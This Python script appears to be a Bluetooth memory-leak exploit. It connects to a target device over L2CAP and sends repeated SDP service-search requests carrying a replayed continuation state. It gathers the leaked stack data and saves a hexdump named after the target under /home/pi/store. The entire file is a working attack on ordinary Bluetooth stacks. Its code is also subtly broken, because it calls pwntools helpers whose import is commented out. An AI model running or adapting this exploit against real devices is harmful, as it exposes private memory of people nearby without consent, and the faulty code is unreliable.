import logging
#from pwn import (
#    context,
#    hexdump,
#    p16,
#
#)
import bluetooth
from lcubo_helpers import incremental_filename

logger = logging.getLogger(__name__)


def packet(service, continuation_state):
    pkt = '\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += '\x35\x03\x19'
    pkt += p16(service)
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt


def exploit(target):
    service_long = 0x0100
    service_short = 0x0001
    mtu = 50
    n = 30

    #p = log.progress('Exploit')
    #p.status('Creating L2CAP socket')
    logger.info('Creating L2CAP socket')

    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'

    logger.info('Connecting to target')
    sock.connect((target, 1))

    logger.info('Sending packet 0')
    sock.send(packet(service_long, '\x00'))
    data = sock.recv(mtu)

    if data[-3] != '\x02':
        logger.error('Invalid continuation state received.')

    stack = ''

    for i in range(1, n):
        logger.info('Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        data = sock.recv(mtu)
        stack += data[9:-3]

    sock.close()

    logger.info('Done')
    filename = incremental_filename('/home/pi/store', f'blue_dump_{target}')
    with open(filename, 'wb') as blue_dump:
        blue_dump.write(hexdump(stack))
